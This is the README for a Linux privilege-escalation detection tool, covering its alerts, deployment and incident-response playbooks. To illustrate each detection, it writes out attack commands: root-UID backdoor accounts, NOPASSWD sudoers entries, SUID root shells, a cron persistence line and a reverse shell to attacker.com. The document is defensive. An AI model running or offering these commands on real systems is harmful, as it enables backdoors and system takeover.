# Privilege Escalation Detector (PED)

A comprehensive Python tool for detecting privilege escalation attempts, insider threats, and unauthorized privilege changes on Linux systems. Essential for healthcare environments, critical infrastructure, and high-security systems.

## 🎯 Perfect For

- **Insider Threat Detection** - Catch malicious employees escalating privileges
- **Healthcare Security (HIPAA)** - Monitor access to sensitive systems
- **Critical Infrastructure** - Detect nation-state actors gaining root
- **Compliance Auditing** - Demonstrate separation of duties
- **Incident Response** - Identify how attackers gained elevated access
- **Zero Trust Validation** - Continuously verify least privilege

## ✨ Features

- ✅ **User Account Monitoring** - Detect new accounts, UID changes, deleted users
- ✅ **Group Membership Tracking** - Monitor additions to sudo, wheel, docker, admin groups
- ✅ **Sudoers Configuration** - Detect sudo access grants and NOPASSWD changes
- ✅ **SUID/SGID Detection** - Find new elevated privilege binaries
- ✅ **Sudo Usage Analysis** - Track who's using sudo and what commands
- ✅ **Suspicious Process Detection** - Identify malicious processes running as root
- ✅ **Baseline Comparison** - Snapshot-based change detection
- ✅ **Severity Classification** - CRITICAL, HIGH, MEDIUM, LOW alerts
- ✅ **JSON Reporting** - Export for SIEM integration
- ✅ **Zero Dependencies** - Pure Python 3 standard library

## 🚀 Quick Start

### 1. Create Baseline (First Time)
```bash
# Create initial privilege state snapshot
sudo python3 ped.py --create-baseline
```

**Output:**
```
======================================================================
Creating Privilege Escalation Baseline
======================================================================

📊 Collecting system privilege information...

📋 Baseline Statistics:
   Total users: 22
   Users with UID 0 (root): 1
      → root
   Total groups: 43
   Privileged groups: 3
      → root, adm, sudo
   Users with sudo access: 2
      → admin, developer
   NOPASSWD sudo entries: 0
   SUID files found: 26
   SGID files found: 8

✅ Baseline created successfully!
💾 Saved to: ped_baseline.json
```

### 2. Check for Privilege Escalation
```bash
# Run detection check
sudo python3 ped.py --check

# With detailed report
sudo python3 ped.py --check --export incident_report.json

# Skip sudo usage check (faster)
sudo python3 ped.py --check --no-sudo
```

## 🔍 What PED Detects

### 1. Backdoor Account Creation (CRITICAL)
```
🚨 [CRITICAL] NEW_USER: New user account created: attacker
   uid: 0
   gid: 0
   shell: /bin/bash
   is_root_uid: True
```

**Attack:** Attacker adds account with root privileges
```bash
echo "attacker:x:0:0:Backdoor:/root:/bin/bash" >> /etc/passwd
```

### 2. UID Manipulation (CRITICAL)
```
🚨 [CRITICAL] UID_CHANGED: UID changed for user: john
   old_uid: 1000
   new_uid: 0
```

**Attack:** Changing regular user to root UID
```bash
sed -i 's/john:x:1000:/john:x:0:/' /etc/passwd
```

### 3. Sudo Access Grants (CRITICAL)
```
🚨 [CRITICAL] SUDO_ACCESS_GRANTED: New sudo access granted
   users: hacker
```

**Attack:** Adding user to sudoers
```bash
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

### 4. Passwordless Sudo (CRITICAL)
```
🚨 [CRITICAL] SUDO_NOPASSWD_GRANTED: NOPASSWD sudo access granted
   entities: backdoor_user
```

**Attack:** Granting sudo without password
```bash
echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

### 5. Privileged Group Addition (HIGH)
```
⚠️ [HIGH] GROUP_MEMBERSHIP_ADDED: User(s) added to group 'sudo'
   new_members: attacker
   is_privileged_group: True
```

**Attack:** Adding user to privileged group
```bash
usermod -aG sudo attacker
usermod -aG docker attacker  # Docker = effective root!
```

### 6. New SUID/SGID Files (CRITICAL)
```
🚨 [CRITICAL] NEW_SUID_SGID: New SUID/SGID file detected
   path: /tmp/.hidden_shell
   is_suid: True
   owner_uid: 0
```

**Attack:** Creating SUID root shell
```bash
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell
```

### 7. SUID Bit Changes (CRITICAL)
```
🚨 [CRITICAL] SUID_BIT_CHANGED: SUID bit changed on file
   path: /usr/bin/python3
   old_suid: False
   new_suid: True
```

**Attack:** Making Python SUID (instant root)
```bash
chmod u+s /usr/bin/python3
# Now: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 8. Suspicious Processes (HIGH)
```
⚠️ [HIGH] SUSPICIOUS_PROCESS: Suspicious process running as root
   pid: 12345
   command: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
   reason: Root running suspicious network/scripting command
```

**Attack:** Reverse shell as root
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### 9. User Account Deletion (MEDIUM)
```
⚡ [MEDIUM] USER_DELETED: User account deleted: admin
   uid: 1001
```

**Attack:** Covering tracks by deleting accounts
```bash
userdel admin
```

## 💼 Real-World Attack Scenarios

### Scenario 1: Insider Threat - Hospital Employee
**Context:** Disgruntled IT admin in healthcare environment

**Attack Timeline:**
```bash
# 1. Create backdoor account
sudo useradd -u 0 -g 0 -m -s /bin/bash backdoor

# 2. Add to sudo group for legitimacy
sudo usermod -aG sudo backdoor

# 3. Grant NOPASSWD for stealth access
echo "backdoor ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers.d/backdoor
```

**PED Detection:**
```
🚨 [CRITICAL] NEW_USER: New user account created: backdoor
   uid: 0  ← Root UID!
   is_root_uid: True

⚠️ [HIGH] GROUP_MEMBERSHIP_ADDED: User(s) added to group 'sudo'
   new_members: backdoor

🚨 [CRITICAL] SUDO_NOPASSWD_GRANTED: NOPASSWD sudo access granted
   entities: backdoor

DETECTION TIME: < 5 minutes (next scheduled check)
```

### Scenario 2: External Attacker - Privilege Escalation
**Context:** Attacker exploited web vulnerability, gained limited shell

**Attack Timeline:**
```bash
# 1. Upload SUID root shell via web vulnerability
cp /bin/bash /var/www/html/uploads/.system
chmod u+s /var/www/html/uploads/.system

# 2. Modify existing SUID binary
chmod u+s /usr/bin/find
# Now: find . -exec /bin/sh \;

# 3. Create cron job for persistence as root
echo "* * * * * root /tmp/.backdoor.sh" >> /etc/crontab
```

**PED Detection:**
```
🚨 [CRITICAL] NEW_SUID_SGID: New SUID/SGID file detected
   path: /var/www/html/uploads/.system

🚨 [CRITICAL] SUID_BIT_CHANGED: SUID bit changed on file
   path: /usr/bin/find

DETECTION TIME: Immediate on next check
ACTION: Quarantine system, investigate web server breach
```

### Scenario 3: Supply Chain Attack - Compromised Update
**Context:** Malicious software update compromises system

**Attack Timeline:**
```bash
# Malicious update script runs as root during package install
# 1. Modify existing admin account
sed -i 's/admin:x:1001:/admin:x:0:/' /etc/passwd

# 2. Add backdoor to sudo group
usermod -aG sudo malware_user

# 3. Install persistent SUID backdoor
cp /tmp/payload /usr/local/bin/.update
chmod 4755 /usr/local/bin/.update
```

**PED Detection:**
```
🚨 [CRITICAL] UID_CHANGED: UID changed for user: admin
   old_uid: 1001
   new_uid: 0

⚠️ [HIGH] GROUP_MEMBERSHIP_ADDED: User(s) added to group 'sudo'
   new_members: malware_user

🚨 [CRITICAL] NEW_SUID_SGID: New SUID/SGID file detected
   path: /usr/local/bin/.update

DETECTION TIME: Next scheduled check
ACTION: Rollback update, forensic analysis, vendor notification
```

## 📊 Healthcare & Critical Infrastructure Use Cases

### Healthcare Environment (HIPAA Compliance)

**Monitoring Requirements:**
- Track access to EHR systems
- Detect privilege escalation to patient data
- Monitor insider threats
- Demonstrate access control compliance

**PED Configuration:**
```bash
# Create baseline after system hardening
sudo python3 ped.py --create-baseline

# Hourly checks for critical systems
0 * * * * /usr/bin/python3 /usr/local/bin/ped.py --check --export /var/log/ped/ped_$(date +\%Y\%m\%d_\%H).json

# Alert on any CRITICAL findings
0 * * * * /usr/local/bin/ped_check_and_alert.sh
```

**ped_check_and_alert.sh:**
```bash
#!/bin/bash
if ! /usr/bin/python3 /usr/local/bin/ped.py --check; then
    # Alert security team
    echo "CRITICAL: Privilege escalation detected on $(hostname)" | \
    mail -s "PED ALERT" security@hospital.org
    
    # Log to SIEM
    logger -p auth.crit "PED: Privilege escalation detected"
fi
```

### Critical Infrastructure (SCADA/ICS)

**Threat Model:**
- Nation-state actors seeking persistent access
- Sabotage via elevated privileges
- Credential theft and lateral movement

**PED Deployment:**
```bash
# Monitor control system access
sudo python3 ped.py --create-baseline

# Real-time monitoring every 5 minutes
*/5 * * * * /usr/local/bin/ped.py --check

# Immediate isolation on CRITICAL alerts
*/5 * * * * /usr/local/bin/ped_check_isolate.sh
```

**ped_check_isolate.sh:**
```bash
#!/bin/bash
if ! python3 /usr/local/bin/ped.py --check --export /tmp/ped_report.json; then
    # Check severity
    CRITICAL=$(cat /tmp/ped_report.json | jq '.severity_counts.CRITICAL')
    
    if [ "$CRITICAL" -gt 0 ]; then
        # CRITICAL finding - isolate system
        echo "CRITICAL privilege escalation - initiating isolation"
        
        # Block network (except management)
        iptables -A INPUT -j DROP
        iptables -A OUTPUT -j DROP
        iptables -I INPUT -s 10.0.0.0/8 -j ACCEPT
        iptables -I OUTPUT -d 10.0.0.0/8 -j ACCEPT
        
        # Alert incident response
        curl -X POST https://incident-response.company.com/api/alert \
             -H "Content-Type: application/json" \
             -d @/tmp/ped_report.json
    fi
fi
```

## 🛡️ Defense in Depth Integration

### Layer 1: Prevention
```bash
# Implement least privilege
# Disable root login
# Use sudo with logging
# Implement MFA
```

### Layer 2: Detection (PED)
```bash
# Continuous monitoring
sudo python3 ped.py --check

# Baseline after changes
sudo python3 ped.py --create-baseline
```

### Layer 3: Response
```bash
# Automated isolation
# Forensic capture
# Incident response playbook activation
```

## 📈 Compliance & Auditing

### HIPAA Requirements
- **§164.308(a)(3)(i)** - Workforce access control
- **§164.308(a)(4)(i)** - Access authorization
- **§164.312(a)(1)** - Access control implementation

**Evidence:**
```bash
# Generate compliance report
python3 ped.py --check --export compliance_$(date +%Y%m).json

# Demonstrate monitoring
ls -lh /var/log/ped/*.json
```

### PCI-DSS Requirements
- **Requirement 7** - Restrict access by business need to know
- **Requirement 10.2.5** - Use of privileged accounts

**Audit Trail:**
```json
{
  "timestamp": "2025-10-30T00:49:15.033053",
  "alerts": {
    "SUDO_ACCESS_GRANTED": [
      {
        "timestamp": "2025-10-30T10:15:30",
        "user": "contractor_john",
        "action": "sudo access granted"
      }
    ]
  }
}
```

## 🔧 Advanced Configuration

### Custom Baseline Locations
```bash
# Separate baselines for different environments
python3 ped.py --baseline /secure/prod_baseline.json --create-baseline
python3 ped.py --baseline /secure/dev_baseline.json --create-baseline

# Check against specific baseline
python3 ped.py --baseline /secure/prod_baseline.json --check
```

### Automated Baseline Updates
```bash
#!/bin/bash
# update_baseline.sh - Run after approved maintenance

# Backup old baseline
cp ped_baseline.json ped_baseline_$(date +%Y%m%d).json.bak

# Create new baseline
python3 ped.py --create-baseline

# Verify new baseline
python3 ped.py --check
```

### Performance Optimization
```bash
# Skip process checks for faster scans
python3 ped.py --check --no-processes

# Skip sudo usage for historical analysis
python3 ped.py --check --no-sudo

# Full comprehensive check (slowest)
python3 ped.py --check
```

## 📊 Detection Metrics

### Key Performance Indicators

```bash
# Generate monthly metrics
for report in /var/log/ped/ped_*.json; do
    jq '.severity_counts' $report
done | jq -s 'add'

# Output:
{
  "CRITICAL": 3,
  "HIGH": 12,
  "MEDIUM": 45,
  "LOW": 78
}
```

**Metrics to Track:**
- Total privilege escalation attempts
- Mean time to detection (MTTD)
- False positive rate
- Critical findings per month
- Most targeted privileged groups

## 🚨 Incident Response Integration

### Alert Severity Response Matrix

| Severity | Response Time | Actions |
|----------|--------------|---------|
| CRITICAL | Immediate | Isolate system, alert IR team, preserve evidence |
| HIGH | < 1 hour | Investigate, document, escalate if confirmed |
| MEDIUM | < 4 hours | Review, determine if legitimate, log findings |
| LOW | < 24 hours | Document for audit trail |

### Incident Response Playbook

**Step 1: Detection**
```bash
PED Alert: CRITICAL - NEW_USER with UID 0 detected
```

**Step 2: Verification**
```bash
# Check user details
cat /etc/passwd | grep attacker

# Check sudo usage
tail -100 /var/log/auth.log | grep sudo

# Check recent logins
last -100

# Export full report
python3 ped.py --check --export /incident/evidence_$(date +%s).json
```

**Step 3: Containment**
```bash
# Lock suspicious account
passwd -l attacker

# Disable network access
iptables -A INPUT -m state --state NEW -j DROP

# Kill suspicious processes
pkill -u attacker
```

**Step 4: Eradication**
```bash
# Remove backdoor account
userdel -r attacker

# Restore from baseline
# Compare baseline to determine all changes
python3 compare_baseline.py
```

**Step 5: Recovery**
```bash
# Recreate baseline
python3 ped.py --create-baseline

# Verify system integrity
python3 ped.py --check
```

## 💡 Pro Tips

1. **Baseline Immediately After Hardening** - Create baseline right after securing the system
2. **Store Baselines Securely** - Keep baselines read-only or on separate secure storage
3. **Schedule Regular Checks** - Hourly for critical systems, daily for normal systems
4. **Integrate with SIEM** - Export JSON reports to centralized logging
5. **Test Incident Response** - Run simulated attacks to test detection and response
6. **Version Control Baselines** - Track baseline changes over time
7. **Separate Baselines** - Use different baselines for dev/staging/production
8. **Monitor the Monitor** - Ensure PED itself hasn't been compromised

## 🔗 Integration Examples

### Splunk
```bash
# Send PED reports to Splunk
python3 ped.py --check --export - | \
  curl -k "https://splunk:8088/services/collector" \
  -H "Authorization: Splunk YOUR_TOKEN" \
  -d @-
```

### Elasticsearch
```bash
# Index in Elasticsearch
python3 ped.py --check --export /tmp/ped.json
curl -X POST "localhost:9200/ped-alerts/_doc" \
  -H 'Content-Type: application/json' \
  -d @/tmp/ped.json
```

### Slack
```bash
# Send alert to Slack
if ! python3 ped.py --check; then
  curl -X POST YOUR_WEBHOOK_URL \
    -H 'Content-Type: application/json' \
    -d '{"text":"🚨 Privilege escalation detected on $(hostname)"}'
fi
```

## 📚 References

- MITRE ATT&CK: TA0004 (Privilege Escalation)
- NIST SP 800-53: AC-2 (Account Management)
- CIS Controls: 5.4 (Restrict Administrator Privileges)
- HIPAA Security Rule: §164.308(a)(3)
- PCI-DSS: Requirement 7 & 8

## ⚠️ Important Notes

- **Root/Sudo Required** - PED needs elevated privileges to read system files
- **Baseline Security** - Protect baseline files from tampering
- **False Positives** - Legitimate admin changes will trigger alerts
- **Performance** - Full checks can take 30-60 seconds on large systems
- **Not Prevention** - PED is detective, not preventive control

## 📄 License

MIT License - Use for security monitoring and compliance

---

**Remember:** Privilege escalation is often the critical step between initial compromise and total system takeover. Early detection saves your infrastructure!
